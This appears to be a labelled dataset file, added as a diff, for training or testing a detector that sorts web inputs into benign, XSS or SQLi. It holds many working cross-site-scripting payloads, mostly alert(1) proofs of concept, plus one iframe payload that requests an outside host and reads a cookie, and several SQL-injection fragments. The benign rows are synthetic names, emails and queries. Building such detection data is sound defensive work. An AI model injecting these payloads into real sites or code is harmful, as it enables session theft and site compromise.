+{"input":"what is machine learning?","label":"benign"}
+{"input":"<nextid oncontextmenu=\"alert(1)\">test<\/nextid>","label":"XSS"}
+{"input":"<optgroup id=x tabindex=1 onactivate=alert(1)><\/optgroup>","label":"XSS"}
+{"input":"<center onkeyup=\"alert(1)\" contenteditable>test<\/center>","label":"XSS"}
+{"input":"<isindex onkeypress=\"alert(1)\" contenteditable>test<\/isindex>","label":"XSS"}
+{"input":"<ul id=x tabindex=1 onactivate=alert(1)><\/ul>","label":"XSS"}
+{"input":"<dfn onkeydown=\"alert(1)\" contenteditable>test<\/dfn>","label":"XSS"}
+{"input":"<spacer id=x tabindex=1 onfocus=alert(1)><\/spacer>","label":"XSS"}
+{"input":"Contact: nenglish@example.net","label":"benign"}
+{"input":"<mark onmouseleave=\"alert(1)\">test<\/mark>","label":"XSS"}
+{"input":"<rt ondblclick=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"Helpful post!","label":"benign"}
+{"input":"<dialog onpaste=\"alert(1)\" contenteditable>test<\/dialog>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><dt ondragover=alert(1) contenteditable>drop here<\/dt>","label":"XSS"}
+{"input":"<wbr draggable=\"true\" ondragleave=\"alert(1)\">test<\/wbr>","label":"XSS"}
+{"input":"<area onmouseenter=\"alert(1)\">test<\/area>","label":"XSS"}
+{"input":"\/*start*\/'=0--+\/*end*\/","label":"SQLi"}
+{"input":"{\"user\": \"peter92\", \"action\": \"edit\", \"timestamp\": \"2019-05-23T04:26:34\"}","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><map id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/map>","label":"XSS"}
+{"input":"name=ebrown&email=nrandall@example.net","label":"benign"}
+{"input":"<svg><frameset onload=alert(1)><\/frameset>","label":"XSS"}
+{"input":"<svg><datalist onload=alert(1)><\/datalist>","label":"XSS"}
+{"input":"Hello, my name is Kevin Bryant.","label":"benign"}
+{"input":"<table draggable=\"true\" ondragstart=\"alert(1)\">test<\/table>","label":"XSS"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"how to cooking tutorial","label":"benign"}
+{"input":"<output onmouseenter=\"alert(1)\">test<\/output>","label":"XSS"}
+{"input":"<blockquote onmouseleave=\"alert(1)\">test<\/blockquote>","label":"XSS"}
+{"input":"<pre id=x tabindex=1 onbeforeactivate=alert(1)><\/pre>","label":"XSS"}
+{"input":"<p onmouseenter=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><ol id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/ol>","label":"XSS"}
+{"input":"page=10&sort=desc","label":"benign"}
+{"input":"<th draggable=\"true\" ondragenter=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/a>","label":"XSS"}
+{"input":"GET \/main\/wp-content\/posts HTTP\/1.1","label":"benign"}
+{"input":"<td ondblclick=\"alert(1)\">test<\/td>","label":"XSS"}
+{"input":"<body onkeyup=\"alert(1)\" contenteditable>test<\/body>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><address id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/address>","label":"XSS"}
+{"input":"<figcaption onbeforecut=\"alert(1)\" contenteditable>test<\/figcaption>","label":"XSS"}
+{"input":"<dialog draggable=\"true\" ondragenter=\"alert(1)\">test<\/dialog>","label":"XSS"}
+{"input":"<time id=x tabindex=1 ondeactivate=alert(1)><\/time><input id=y autofocus>","label":"XSS"}
+{"input":"<li onbeforecopy=\"alert(1)\" contenteditable>test<\/li>","label":"XSS"}
+{"input":"Hello, my name is Robert Marsh.","label":"benign"}
+{"input":"'\/*random*\/ AND%09 MID(VERSION(),1,1)\/**\/ =%09 '5';%09","label":"SQLi"}
+{"input":"Hello, my name is Carlos Watts.","label":"benign"}
+{"input":"rotacidni etubirtta dracdliw        %","label":"SQLi"}
+{"input":"<i onmouseleave=\"alert(1)\">test<\/i>","label":"XSS"}
+{"input":"Hello, my name is Corey Sweeney.","label":"benign"}
+{"input":"Contact: paulchan@example.org","label":"benign"}
+{"input":"<x contenteditable onpaste=alert(1)>paste here!","label":"XSS"}
+{"input":"CoMmEnTs:","label":"SQLi"}
+{"input":"<frame onmouseenter=\"alert(1)\">test<\/frame>","label":"XSS"}
+{"input":"<style draggable=\"true\" ondragstart=\"alert(1)\">test<\/style>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><i style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/i>","label":"XSS"}
+{"input":"Hello, my name is Kathleen Macias.","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><acronym style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/acronym>","label":"XSS"}
+{"input":"<strong draggable=\"true\" ondrag=\"alert(1)\">test<\/strong>","label":"XSS"}
+{"input":"Hello, my name is Zachary Hubbard.","label":"benign"}
+{"input":"<em onkeyup=\"alert(1)\" contenteditable>test<\/em>","label":"XSS"}
+{"input":"<sub id=x tabindex=1 onbeforeactivate=alert(1)><\/sub>","label":"XSS"}
+{"input":"Contact: berryjohn@example.com","label":"benign"}
+{"input":"Hello, my name is David Reese.","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><menuitem ondragover=alert(1) contenteditable>drop here<\/menuitem>","label":"XSS"}
+{"input":"<meta onmousedown=\"alert(1)\">test<\/meta>","label":"XSS"}
+{"input":"<dt onmousemove=\"alert(1)\">test<\/dt>","label":"XSS"}
+{"input":"getURL(\"javascript:alert('XSS')\")","label":"XSS"}
+{"input":"{\"user\": \"smithkimberly\", \"action\": \"delete\", \"timestamp\": \"1987-06-17T13:07:53\"}","label":"benign"}
+{"input":"{\"user\": \"collinsalexandra\", \"action\": \"view\", \"timestamp\": \"1972-11-28T21:49:30\"}","label":"benign"}
+{"input":"Insightful read!","label":"benign"}
+{"input":"Hello, my name is Jamie Powell.","label":"benign"}
+{"input":"<sub onkeypress=\"alert(1)\" contenteditable>test<\/sub>","label":"XSS"}
+{"input":"<data onkeydown=\"alert(1)\" contenteditable>test<\/data>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><kbd id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/kbd>","label":"XSS"}
+{"input":"<video onkeypress=\"alert(1)\" contenteditable>test<\/video>","label":"XSS"}
+{"input":"<basefont onmouseout=\"alert(1)\">test<\/basefont>","label":"XSS"}
+{"input":"Hello, my name is Jeffrey Murphy.","label":"benign"}
+{"input":"<noframes draggable=\"true\" ondragleave=\"alert(1)\">test<\/noframes>","label":"XSS"}
+{"input":"name=kristen45&email=prestonkaylee@example.org","label":"benign"}
+{"input":"<shadow oncopy=\"alert(1)\" contenteditable>test<\/shadow>","label":"XSS"}
+{"input":"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text\/html; charset=UTF-7\"> <\/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-\/SCRIPT+AD4-","label":"XSS"}
+{"input":"<noscript onmouseover=\"alert(1)\">test<\/noscript>","label":"XSS"}
+{"input":"<button oncontextmenu=\"alert(1)\">test<\/button>","label":"XSS"}
+{"input":"<sup draggable=\"true\" ondragend=\"alert(1)\">test<\/sup>","label":"XSS"}
+{"input":"<textarea draggable=\"true\" ondragend=\"alert(1)\">test<\/textarea>","label":"XSS"}
+{"input":"<div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->","label":"XSS"}
+{"input":"{\"user\": \"jeffreyschultz\", \"action\": \"edit\", \"timestamp\": \"2021-04-14T10:40:25\"}","label":"benign"}
+{"input":"<form oncopy=\"alert(1)\" contenteditable>test<\/form>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><xmp id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/xmp>","label":"XSS"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<time onblur=alert(1) tabindex=1 id=x><\/time><input autofocus>","label":"XSS"}
+{"input":"best travel books","label":"benign"}
+{"input":"<frameset onmousemove=\"alert(1)\">test<\/frameset>","label":"XSS"}
+{"input":"\/*start*\/#        Hash comment\/*end*\/","label":"SQLi"}
+{"input":"\/*start*\/AND true\/*end*\/","label":"SQLi"}
+{"input":"Contact: felicia96@example.com","label":"benign"}
+{"input":"<header draggable=\"true\" ondragend=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<set attributeName=\"onmouseover\" to=\"alert(89)\"\/>","label":"XSS"}
+{"input":"<pre draggable=\"true\" ondragleave=\"alert(1)\">test<\/pre>","label":"XSS"}
+{"input":"GET \/blog HTTP\/1.1","label":"benign"}
+{"input":"<div style=content:url(data:image\/svg+xml,%3Csvg\/%3E);visibility:hidden onload=alert(41)><\/div>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"Hello, my name is Jessica Scott.","label":"benign"}
+{"input":"Contact: daniel40@example.net","label":"benign"}
+{"input":"<font onbeforecut=\"alert(1)\" contenteditable>test<\/font>","label":"XSS"}
+{"input":"{\"user\": \"turnercharles\", \"action\": \"edit\", \"timestamp\": \"2005-05-12T05:57:04\"}","label":"benign"}
+{"input":"what is travel?","label":"benign"}
+{"input":"<noembed oncopy=\"alert(1)\" contenteditable>test<\/noembed>","label":"XSS"}
+{"input":"<spacer id=x tabindex=1 onbeforedeactivate=alert(1)><\/spacer><input autofocus>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><command id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/command>","label":"XSS"}
+{"input":"Contact: annaosborne@example.org","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><picture style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/picture>","label":"XSS"}
+{"input":"{\"user\": \"burnsrichard\", \"action\": \"download\", \"timestamp\": \"1994-04-28T09:55:27\"}","label":"benign"}
+{"input":"Great article!","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><main ondrop=alert(1) contenteditable>drop here<\/main>","label":"XSS"}
+{"input":"{\"user\": \"timothybutler\", \"action\": \"download\", \"timestamp\": \"1975-06-05T07:17:23\"}","label":"benign"}
+{"input":"<frameset ondblclick=\"alert(1)\">test<\/frameset>","label":"XSS"}
+{"input":"<aside oncopy=\"alert(1)\" contenteditable>test<\/aside>","label":"XSS"}
+{"input":"<select onchange=alert(1)><option>change me<\/option><option>XSS<\/option><\/select>","label":"XSS"}
+{"input":"{\"user\": \"simmonschristopher\", \"action\": \"download\", \"timestamp\": \"2021-05-24T04:50:00\"}","label":"benign"}
+{"input":"{\"user\": \"fernandezcassandra\", \"action\": \"edit\", \"timestamp\": \"1987-01-12T22:44:31\"}","label":"benign"}
+{"input":"GET \/category\/categories HTTP\/1.1","label":"benign"}
+{"input":"<nextid draggable=\"true\" ondrag=\"alert(1)\">test<\/nextid>","label":"XSS"}
+{"input":"Hello, my name is Heather Murphy.","label":"benign"}
+{"input":"<kbd draggable=\"true\" ondragend=\"alert(1)\">test<\/kbd>","label":"XSS"}
+{"input":"name=walkerchristopher&email=mccartynicole@example.net","label":"benign"}
+{"input":"page=1&sort=asc","label":"benign"}
+{"input":"<acronym onblur=alert(1) tabindex=1 id=x><\/acronym><input autofocus>","label":"XSS"}
+{"input":"best python books","label":"benign"}
+{"input":"<map onmouseout=\"alert(1)\">test<\/map>","label":"XSS"}
+{"input":"<samp id=x tabindex=1 onbeforedeactivate=alert(1)><\/samp><input autofocus>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><dialog ondragover=alert(1) contenteditable>drop here<\/dialog>","label":"XSS"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<progress onpaste=\"alert(1)\" contenteditable>test<\/progress>","label":"XSS"}
+{"input":"Contact: wyattjohn@example.com","label":"benign"}
+{"input":"<table id=x tabindex=1 onbeforedeactivate=alert(1)><\/table><input autofocus>","label":"XSS"}
+{"input":"{\"user\": \"ashleyoconnor\", \"action\": \"view\", \"timestamp\": \"2021-10-07T22:18:43\"}","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><div ondrop=alert(1) contenteditable>drop here<\/div>","label":"XSS"}
+{"input":"<bgsound onpaste=\"alert(1)\" contenteditable>test<\/bgsound>","label":"XSS"}
+{"input":"<nav onmouseup=\"alert(1)\">test<\/nav>","label":"XSS"}
+{"input":"<menuitem ondblclick=\"alert(1)\">test<\/menuitem>","label":"XSS"}
+{"input":"<div onkeypress=\"alert(1)\" contenteditable>test<\/div>","label":"XSS"}
+{"input":"<main id=x tabindex=1 onactivate=alert(1)><\/main>","label":"XSS"}
+{"input":"<link onbeforecut=\"alert(1)\" contenteditable>test<\/link>","label":"XSS"}
+{"input":"<caption draggable=\"true\" ondragleave=\"alert(1)\">test<\/caption>","label":"XSS"}
+{"input":"<strike onmouseup=\"alert(1)\">test<\/strike>","label":"XSS"}
+{"input":"{\"user\": \"ryanbradley\", \"action\": \"edit\", \"timestamp\": \"1970-02-14T08:32:45\"}","label":"benign"}
+{"input":"username=elizabethbenton&password=J6UU^a^j#A","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><dd style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/dd>","label":"XSS"}
+{"input":"Contact: melissaphillips@example.com","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><tt style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/tt>","label":"XSS"}
+{"input":"<embed onmouseover=\"alert(1)\">test<\/embed>","label":"XSS"}
+{"input":"Contact: greenfrank@example.com","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><aside id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/aside>","label":"XSS"}
+{"input":"{\"user\": \"connorjones\", \"action\": \"delete\", \"timestamp\": \"1996-02-14T19:26:24\"}","label":"benign"}
+{"input":"<track onbeforecopy=\"alert(1)\" contenteditable>test<\/track>","label":"XSS"}
+{"input":"<listener event=\"load\" handler=\"#y\" xmlns=\"http:\/\/www.w3.org\/2001\/xml-events\" observer=\"x\"\/>","label":"XSS"}
+{"input":"GET \/wp-content\/list HTTP\/1.1","label":"benign"}
+{"input":"<plaintext onbeforecut=\"alert(1)\" contenteditable>test<\/plaintext>","label":"XSS"}
+{"input":"{\"user\": \"philipbrown\", \"action\": \"view\", \"timestamp\": \"1973-06-02T18:00:39\"}","label":"benign"}
+{"input":"<ruby id=x tabindex=1 onbeforedeactivate=alert(1)><\/ruby><input autofocus>","label":"XSS"}
+{"input":"<svg onbeforepaste=\"alert(1)\" contenteditable>test<\/svg>","label":"XSS"}
+{"input":"<style onkeydown=\"alert(1)\" contenteditable>test<\/style>","label":"XSS"}
+{"input":"<meter onmouseleave=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<style id=x tabindex=1 onbeforeactivate=alert(1)><\/style>","label":"XSS"}
+{"input":"<figcaption onkeyup=\"alert(1)\" contenteditable>test<\/figcaption>","label":"XSS"}
+{"input":"Nice tutorial!","label":"benign"}
+{"input":"<dl id=x tabindex=1 ondeactivate=alert(1)><\/dl><input id=y autofocus>","label":"XSS"}
+{"input":"{\"user\": \"meltonchristina\", \"action\": \"view\", \"timestamp\": \"1980-03-20T20:57:05\"}","label":"benign"}
+{"input":"<applet id=x tabindex=1 onbeforedeactivate=alert(1)><\/applet><input autofocus>","label":"XSS"}
+{"input":"feedback=Toward physical stand sea.","label":"benign"}
+{"input":"<rt onmouseenter=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"<abbr id=x tabindex=1 onfocus=alert(1)><\/abbr>","label":"XSS"}
+{"input":"<li oncopy=\"alert(1)\" contenteditable>test<\/li>","label":"XSS"}
+{"input":"\"","label":"SQLi"}
+{"input":"top 10 python blogs","label":"benign"}
+{"input":"<body onmouseover=\"alert(1)\">test<\/body>","label":"XSS"}
+{"input":"<spacer onmousemove=\"alert(1)\">test<\/spacer>","label":"XSS"}
+{"input":"<u onmouseleave=\"alert(1)\">test<\/u>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><blink style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/blink>","label":"XSS"}
+{"input":"GET \/tags\/list HTTP\/1.1","label":"benign"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"top 10 python blogs","label":"benign"}
+{"input":"<bdo onpaste=\"alert(1)\" contenteditable>test<\/bdo>","label":"XSS"}
+{"input":"<form onbeforecopy=\"alert(1)\" contenteditable>test<\/form>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><video id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/video>","label":"XSS"}
+{"input":"top 10 finance blogs","label":"benign"}
+{"input":"exp\/*<XSS STYLE='no\\xss:noxss(\"*\/\/*\");","label":"XSS"}
+{"input":"<dialog id=x tabindex=1 onfocusin=alert(1)><\/dialog>","label":"XSS"}
+{"input":"<big onpaste=\"alert(1)\" contenteditable>test<\/big>","label":"XSS"}
+{"input":"<content onkeyup=\"alert(1)\" contenteditable>test<\/content>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><dir id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/dir>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><base id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/base>","label":"XSS"}
+{"input":"Contact: ydorsey@example.org","label":"benign"}
+{"input":"<code id=x tabindex=1 onactivate=alert(1)><\/code>","label":"XSS"}
+{"input":"<head id=x tabindex=1 onactivate=alert(1)><\/head>","label":"XSS"}
+{"input":"<footer id=x tabindex=1 onbeforedeactivate=alert(1)><\/footer><input autofocus>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><tt id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/tt>","label":"XSS"}
+{"input":"Contact: ijordan@example.net","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><font ondrop=alert(1) contenteditable>drop here<\/font>","label":"XSS"}
+{"input":"<header draggable=\"true\" ondragleave=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<h1 draggable=\"true\" ondragleave=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><strong id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/strong>","label":"XSS"}
+{"input":"<s id=x tabindex=1 onfocusin=alert(1)><\/s>","label":"XSS"}
+{"input":"<cite id=x tabindex=1 onbeforeactivate=alert(1)><\/cite>","label":"XSS"}
+{"input":"\/*start*\/%00\/*end*\/","label":"SQLi"}
+{"input":"<link href=validstyles.css rel=stylesheet onload=alert(1)>","label":"XSS"}
+{"input":"search=cooking examples in 2025","label":"benign"}
+{"input":"<p oncut=\"alert(1)\" contenteditable>test<\/p>","label":"XSS"}
+{"input":"<dialog onmouseleave=\"alert(1)\">test<\/dialog>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><head ondrop=alert(1) contenteditable>drop here<\/head>","label":"XSS"}
+{"input":"\/*start*\/'\/*end*\/","label":"SQLi"}
+{"input":"{\"user\": \"paulyoung\", \"action\": \"download\", \"timestamp\": \"2019-09-13T14:43:38\"}","label":"benign"}
+{"input":"Contact: michaelbrown@example.org","label":"benign"}
+{"input":"<caption onmouseout=\"alert(1)\">test<\/caption>","label":"XSS"}
+{"input":"<q onmouseup=\"alert(1)\">test<\/q>","label":"XSS"}
+{"input":"<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}<\/style>X\/\/[\"'`-->]]>]<\/div><div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX<\/div>\/\/[\"'`-->]]>]<\/div><div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX<\/div>\/\/[\"'`-->]]>]<\/div><div id=\"47\"><svg xmlns=\"http:\/\/www.w3.org\/2000\/svg\"><script>alert(47)<\/script><\/svg>\/\/[\"'`-->]]>]<\/div><div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)<\/SCRIPT>\/\/[\"'`-->]]>]<\/div><div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"><\/OBJECT>\/\/[\"'`-->]]>]<\/div><div id=\"50\"><object data=\"data:text\/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"><\/object>\/\/[\"'`-->]]>]<\/div><div id=\"51\"><embed src=\"data:text\/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"><\/embed>\/\/[\"'`-->]]>]<\/div><div id=\"52\"><x style=\"behavior:url(test.sct)\">\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"<map oncontextmenu=\"alert(1)\">test<\/map>","label":"XSS"}
+{"input":"<td onmouseup=\"alert(1)\">test<\/td>","label":"XSS"}
+{"input":"<mark onbeforepaste=\"alert(1)\" contenteditable>test<\/mark>","label":"XSS"}
+{"input":"GET \/wp-content\/categories\/posts HTTP\/1.1","label":"benign"}
+{"input":"search=top 10 travel blogs","label":"benign"}
+{"input":"{\"user\": \"daisywolfe\", \"action\": \"edit\", \"timestamp\": \"2016-03-22T20:47:22\"}","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><script id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/script>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><li style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/li>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><html ondragover=alert(1) contenteditable>drop here<\/html>","label":"XSS"}
+{"input":"best finance books","label":"benign"}
+{"input":"\/*      C-StYlE CoMmEnT","label":"SQLi"}
+{"input":"Contact: emily04@example.net","label":"benign"}
+{"input":"Hello, my name is Sarah Smith.","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><video style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/video>","label":"XSS"}
+{"input":"<header onmouseenter=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<rt draggable=\"true\" ondrag=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><canvas id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/canvas>","label":"XSS"}
+{"input":"Helpful read!","label":"benign"}
+{"input":"<IMG SRC=javascript:alert(&quot;XSS&quot;)>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><b id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/b>","label":"XSS"}
+{"input":"{\"user\": \"ricejames\", \"action\": \"view\", \"timestamp\": \"1998-03-15T05:25:20\"}","label":"benign"}
+{"input":"Hello, my name is Debra Cameron.","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><aside id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/aside>","label":"XSS"}
+{"input":"<h1 onbeforecopy=\"alert(1)\" contenteditable>test<\/h1>","label":"XSS"}
+{"input":"Contact: ericaelliott@example.net","label":"benign"}
+{"input":"<nobr draggable=\"true\" ondragstart=\"alert(1)\">test<\/nobr>","label":"XSS"}
+{"input":"<center onbeforepaste=\"alert(1)\" contenteditable>test<\/center>","label":"XSS"}
+{"input":"<font id=x tabindex=1 onfocusin=alert(1)><\/font>","label":"XSS"}
+{"input":"<pre onbeforepaste=\"alert(1)\" contenteditable>test<\/pre>","label":"XSS"}
+{"input":"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'<\/script>')%22><\/iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http:\/\/xssme.html5sec.org\/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(\/cookie = '(.*?)'\/)[1]) };xhr.send();","label":"XSS"}
+{"input":"Contact: urusso@example.com","label":"benign"}
+{"input":"<input type=image src=1 onerror=alert(1)>","label":"XSS"}
+{"input":"<cite onmouseover=\"alert(1)\">test<\/cite>","label":"XSS"}
+{"input":"Nice read!","label":"benign"}
+{"input":"Insightful post!","label":"benign"}
+{"input":"<em draggable=\"true\" ondrag=\"alert(1)\">test<\/em>","label":"XSS"}
+{"input":"<IFRAME SRC=\"javascript:alert('XSS');\"><\/IFRAME>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><big style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/big>","label":"XSS"}
+{"input":"Hello, my name is Christopher Brown.","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><li id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/li>","label":"XSS"}
+{"input":"<blink onfocusout=alert(1) tabindex=1 id=x><\/blink><input autofocus>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><img style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/img>","label":"XSS"}
+{"input":"GET \/list\/tags\/tags HTTP\/1.1","label":"benign"}
+{"input":"<colgroup onmouseup=\"alert(1)\">test<\/colgroup>","label":"XSS"}
+{"input":"<rb id=x tabindex=1 onfocusin=alert(1)><\/rb>","label":"XSS"}
+{"input":"<IMG SRC=\"livescript:[code]\">","label":"XSS"}
+{"input":"GET \/search\/search\/posts HTTP\/1.1","label":"benign"}
+{"input":"{\"user\": \"eric65\", \"action\": \"download\", \"timestamp\": \"1994-08-24T14:37:01\"}","label":"benign"}
+{"input":"<strong onmousedown=\"alert(1)\">test<\/strong>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><figcaption style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/figcaption>","label":"XSS"}
+{"input":"{\"user\": \"uscott\", \"action\": \"delete\", \"timestamp\": \"1979-11-09T10:35:11\"}","label":"benign"}
+{"input":"Nice article!","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><del style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/del>","label":"XSS"}
+{"input":"what is music?","label":"benign"}
+{"input":"<image onfocusout=alert(1) tabindex=1 id=x><\/image><input autofocus>","label":"XSS"}
+{"input":"Hello, my name is Lee Cook.","label":"benign"}
+{"input":"<button onclick=\"alert(1)\">test<\/button>","label":"XSS"}
+{"input":"GET \/tags\/tags HTTP\/1.1","label":"benign"}
+{"input":"\\\";alert('XSS');\/\/","label":"XSS"}
+{"input":"best cooking books","label":"benign"}
+{"input":"<center onclick=\"alert(1)\">test<\/center>","label":"XSS"}
+{"input":"%3B","label":"SQLi"}
+{"input":"<content onmouseenter=\"alert(1)\">test<\/content>","label":"XSS"}
+{"input":"<dfn onmousedown=\"alert(1)\">test<\/dfn>","label":"XSS"}
+{"input":"<title draggable=\"true\" ondragstart=\"alert(1)\">test<\/title>","label":"XSS"}
+{"input":"{\"user\": \"wjones\", \"action\": \"delete\", \"timestamp\": \"2019-01-23T16:10:20\"}","label":"benign"}
+{"input":"Hello, my name is Susan Day.","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><details id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/details>","label":"XSS"}
+{"input":"<xmp draggable=\"true\" ondrag=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"<rp onkeydown=\"alert(1)\" contenteditable>test<\/rp>","label":"XSS"}
+{"input":"<footer id=x tabindex=1 onbeforeactivate=alert(1)><\/footer>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><a ondragover=alert(1) contenteditable>drop here<\/a>","label":"XSS"}
+{"input":"{\"user\": \"davidolsen\", \"action\": \"download\", \"timestamp\": \"1992-10-06T23:28:42\"}","label":"benign"}
+{"input":"<keygen onmouseover=\"alert(1)\">test<\/keygen>","label":"XSS"}
+{"input":"Contact: doylejoshua@example.org","label":"benign"}
+{"input":"<optgroup onmouseenter=\"alert(1)\">test<\/optgroup>","label":"XSS"}
+{"input":"Helpful guide!","label":"benign"}
+{"input":"<b onbeforecopy=\"alert(1)\" contenteditable>test<\/b>","label":"XSS"}
+{"input":"<body draggable=\"true\" ondrag=\"alert(1)\">test<\/body>","label":"XSS"}
+{"input":"<a xmlns:xlink=\"http:\/\/www.w3.org\/1999\/xlink\" xlink:href=\"?\">","label":"XSS"}
+{"input":"<progress onmouseup=\"alert(1)\">test<\/progress>","label":"XSS"}
+{"input":"GET \/blog\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"python examples in 2025","label":"benign"}
+{"input":"<blockquote onbeforepaste=\"alert(1)\" contenteditable>test<\/blockquote>","label":"XSS"}
+{"input":"<div onmouseenter=\"alert(1)\">test<\/div>","label":"XSS"}
+{"input":"<script for=document event=onreadystatechange>getElementById('safe123').click()<\/script>","label":"XSS"}
+{"input":"<map onkeydown=\"alert(1)\" contenteditable>test<\/map>","label":"XSS"}
+{"input":"<shadow onmouseleave=\"alert(1)\">test<\/shadow>","label":"XSS"}
